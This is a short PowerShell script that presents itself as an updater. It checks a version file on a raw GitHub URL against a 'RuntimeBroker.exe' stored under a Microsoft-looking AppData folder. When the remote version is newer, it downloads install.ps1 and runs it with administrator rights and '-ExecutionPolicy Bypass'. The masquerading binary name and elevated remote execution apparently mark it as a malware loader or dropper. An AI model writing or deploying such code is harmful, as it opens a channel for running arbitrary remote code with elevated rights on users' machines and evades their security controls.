# Define the URLs and paths
$versionUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/version"
$scriptUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/install.ps1"
$appDataPath = "C:\Users\$env:USERNAME\AppData"
$currentDir = "$appDataPath\Local\Microsoft\RuntimeBroker"
$assemblyFile = "$currentDir\RuntimeBroker.exe"
$tempScriptPath = "$env:TEMP\install.ps1"

# Function to get the version from the server
function Get-ServerVersion {
    try {
        $serverVersion = Invoke-RestMethod -Uri $versionUrl -Method Get -UseBasicParsing
        return $serverVersion
    } catch {
        Write-Error "Failed to retrieve version from the server: $_"
        exit 1
    }
}

# Function to get the version from the assembly file
function Get-AssemblyVersion {
    try {
        $assemblyVersion = (Get-Item $assemblyFile).VersionInfo.ProductVersion
        return $assemblyVersion
    } catch {
        Write-Error "Failed to retrieve version from the assembly file: $_"
        exit 1
    }
}

# Function to download and run the script if needed
function Download-And-Run-Script {
    try {
        Invoke-WebRequest -Uri $scriptUrl -OutFile $tempScriptPath
        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$tempScriptPath`"" -Verb RunAs
    } catch {
        Write-Error "Failed to download or run the script: $_"
        exit 1
    }
}

# Main logic
$serverVersion = Get-ServerVersion
$assemblyVersion = Get-AssemblyVersion

Write-Output "Server Version: $serverVersion"
Write-Output "Assembly Version: $assemblyVersion"

# Compare versions
if ([version]$assemblyVersion -lt [version]$serverVersion) {
    Write-Output "A newer version is available. Downloading and running the update script..."
    Download-And-Run-Script
} else {
    Write-Output "No update is needed. The assembly version is up-to-date."
}
